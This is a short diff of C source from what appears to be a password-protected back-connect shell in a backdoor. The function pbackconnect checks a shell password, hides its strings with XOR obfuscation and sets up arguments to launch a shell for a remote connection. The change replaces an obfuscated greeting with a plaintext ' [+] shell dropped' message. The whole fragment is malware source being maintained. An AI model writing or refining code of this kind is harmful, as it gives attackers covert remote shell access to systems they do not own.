@@ -11,9 +11,7 @@ void pbackconnect(int sock)
 
     if(!strstr(tmp, shell_password)) { CLEAN(shell_password); close(sock); return; }
 
-    char *shell_msg = strdup(SHELL_MSG); xor(shell_msg);
-    write(sock, shell_msg, strlen(shell_msg));
-    CLEAN(shell_msg);
+    write(sock, " [+] shell dropped\n", strlen(" [+] shell dropped\n"));
 
     char *argv[3], *envp[5];
     char *shell_type = strdup(SHELL_TYPE); xor(shell_type);
